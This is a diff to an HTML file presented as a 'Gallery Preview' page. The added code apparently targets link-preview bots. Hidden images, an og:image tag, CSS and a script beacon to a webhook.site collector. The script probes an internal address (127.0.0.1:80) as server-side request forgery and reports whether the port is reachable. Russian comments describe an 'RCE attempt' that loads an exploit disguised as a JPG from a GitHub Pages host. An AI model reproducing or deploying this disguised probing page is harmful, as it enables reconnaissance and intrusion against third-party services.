@@ -1,13 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:image" content="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.jpg">
+    <meta charset="UTF-8">
+    <title>Gallery Preview</title>
+    <meta property="og:image" content="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/OG_BOT_HIT">
 </head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.jpg">
+    <h1>Loading Gallery...</h1>
+    
+    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/STATIC_IMG_HIT" style="display:none;">
 
-    <img src="http://127.0.0.1:80/favicon.ico" onerror="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/INTERNAL_80_PROBED';">
+    <script>
+        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
 
-    <img src="https://ssrf-test-internal.5d2815a1-7a4c-4d21-9462-22b22be8d349.webhook.site/dns_check">
+        function log(path) {
+            var img = new Image();
+            img.src = hook + "/" + path + "?r=" + Math.random();
+        }
+
+        // Подтверждаем, что JS сработал
+        log("JS_ACTIVE_CHECK");
+
+        // 2. Скрытый SSRF через динамический элемент
+        // Пробуем достучаться до внутреннего порта 80
+        var ssrf = new Image();
+        ssrf.onload = function() { log("SSRF_80_OPEN_SUCCESS"); };
+        ssrf.onerror = function() { log("SSRF_80_BLOCKED_OR_CLOSED"); };
+        ssrf.src = "http://127.0.0.1:80/favicon.ico";
+
+        // 3. Попытка RCE (загрузка и выполнение)
+        // Мы просим бота скачать наш "эксплойт", замаскированный под картинку
+        var rce = new Image();
+        rce.src = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.jpg";
+    </script>
+
+    <style>
+        body {
+            background-image: url("https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/CSS_HIT");
+        }
+    </style>
 </body>
 </html>
